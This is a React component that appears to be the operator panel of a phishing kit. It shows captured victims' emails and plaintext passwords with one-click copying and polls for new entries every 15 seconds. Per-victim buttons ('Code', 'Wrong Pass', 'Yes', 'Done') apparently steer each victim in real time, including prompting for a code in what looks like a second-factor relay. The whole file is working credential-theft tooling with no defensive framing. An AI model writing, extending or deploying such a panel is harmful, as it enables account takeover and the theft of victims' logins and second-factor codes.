"use client";
import { changeState, deleteData, getAllData } from "@/actions";
import { useCallback, useEffect, useRef, useState } from "react";
import { useToast } from "./ui/use-toast";
import { usePaginationStore } from "@/app/store/paginationStore";

export default function DashboardDataTable({ admin }) {
  const [data, setData] = useState(null);
  const interval = useRef(null);
  const [pending, setPending] = useState({
    state: false,
    index: 0,
  });
  const { page, limit, setTotal, setLoading, loading } = usePaginationStore();

  // Copies text to clipboard
  function copyToClipboard(text) {
    var input = document.createElement("input");
    input.value = text;
    document.body.appendChild(input);
    input.select();
    document.execCommand("copy");
    document.body.removeChild(input);
  }

  // Fetches data based on the current page and limit
  const getData = useCallback(async () => {
    setLoading(true);
    let res = await getAllData({
      admin: admin,
      page: page,
      limit: limit,
    });
    if (res.success) {
      const parsedData = JSON.parse(res.data);
      setData(parsedData);
      setTotal(Math.ceil(res.total / limit)); // Set total pages correctly based on the total count
    }
    setLoading(false);
  }, [admin, page, limit, setTotal]);

  // Detects device type from user agent
  function detectDeviceType(userAgent) {
    const mobileRegex = /Mobile|Android|iPhone|iPad|iPod/;
    const tabletRegex = /Tablet|iPad/;
    const desktopRegex = /Windows NT|Linux|X11|Macintosh|Mac OS X/;
    if (tabletRegex.test(userAgent)) {
      return "tablet";
    } else if (mobileRegex.test(userAgent)) {
      return "mobile";
    } else if (desktopRegex.test(userAgent)) {
      return "desktop";
    } else {
      return "unknown";
    }
  }

  const { toast } = useToast();

  // Fetch data when component mounts or page changes, and refresh it every 15 seconds
  useEffect(() => {
    getData();
    if (interval.current) {
      clearInterval(interval.current); // Clear any previous intervals
    }
    interval.current = setInterval(getData, 15000); // Set new interval for refreshing data

    return () => {
      clearInterval(interval.current); // Cleanup on unmount
    };
  }, [getData]);

  if (!data) {
    return (
      <tbody>
        {Array.from({ length: limit }).map((_, index) => (
          <tr key={index}>
            <td colSpan={5} className="border text-center h-20 px-4 py-2">
              loading...
            </td>
          </tr>
        ))}
      </tbody>
    );
  }

  if (data.length === 0) {
    return (
      <tbody>
        <tr className="text-center">
          <td colSpan={4} className="border px-4 text-red-500 py-2">
            No Data
          </td>
        </tr>
      </tbody>
    );
  }

  return (
    <>
      <tbody>
        {loading && (
          <div className="absolute py-2 px-4 text-xl top-5 left-1/2">
            Loading ..
          </div>
        )}
        {data.map((item, index) => (
          <tr key={index}>
            <td className="border cursor-pointer text-nowrap px-4 py-2">
              <div>{new Date(item.createdAt).toLocaleString("en-US")}</div>
            </td>
            <td
              onClick={() => {
                toast({
                  description: "User Agent copied to clipboard",
                });
                copyToClipboard(item.userAgent);
              }}
              className="border cursor-pointer px-4 py-2"
            >
              <div>{detectDeviceType(item.userAgent || "unknown")}</div>
            </td>
            <td
              onClick={() => {
                toast({
                  description: "Email copied to clipboard",
                });
                copyToClipboard(item.email);
              }}
              className="border cursor-pointer px-4 py-2"
            >
              <div className="md:hidden">Email </div>
              <div className="hidden md:block">{item.email || "N/A"}</div>
            </td>
            <td
              onClick={() => {
                toast({
                  description: "Password copied to clipboard",
                });
                copyToClipboard(item.password);
              }}
              className="border cursor-pointer px-4 py-2"
            >
              <div className="md:hidden">Password</div>
              <div className="hidden md:block">{item.password || "N/A"}</div>
            </td>
            <td className="border px-4 py-2 min-w-10 text-nowrap">
              <div className="flex items-center justify-center flex-col gap-2">
                <span className="text-lg font-bold">
                  {item.state} {item.state === "code" && " : " + item.code}
                </span>
                {pending.state && pending.index === index ? (
                  <div>Pending..</div>
                ) : (
                  <div className="flex gap-2">
                    <button
                      onClick={async () => {
                        setPending({ state: true, index: index });
                        let code = prompt("code");
                        await changeState(item._id, "code", code);
                        await getData();
                        setPending({ state: false });
                      }}
                      className="bg-blue-600 rounded-3xl py-1 px-3 text-sm md:text-md"
                    >
                      Code
                    </button>
                    <button
                      onClick={async () => {
                        setPending({ state: true, index: index });
                        await changeState(item._id, "inCorrect");
                        await getData();
                        setPending({ state: false });
                      }}
                      className="bg-red-600 rounded-3xl text-sm md:text-lg py-1 px-3"
                    >
                      Wrong Pass
                    </button>
                    <button
                      onClick={async () => {
                        setPending({ state: true, index: index });
                        await changeState(item._id, "yes");
                        await getData();
                        setPending({ state: false });
                      }}
                      className="bg-blue-600 rounded-3xl py-1 px-3"
                    >
                      Yes
                    </button>
                    <button
                      onClick={async () => {
                        setPending({ state: true, index: index });
                        await changeState(item._id, "done");
                        await getData();
                        setPending({ state: false });
                      }}
                      className="bg-green-600 rounded-3xl py-1 px-3"
                    >
                      Done
                    </button>
                    {admin && (
                      <button
                        onClick={async () => {
                          setPending({ state: true, index: index });
                          await deleteData(item._id);
                          await getData();
                          setPending({ state: false });
                        }}
                        className="bg-red-600 rounded-3xl py-1 px-3"
                      >
                        Delete
                      </button>
                    )}
                  </div>
                )}
              </div>
            </td>
          </tr>
        ))}
      </tbody>
    </>
  );
}
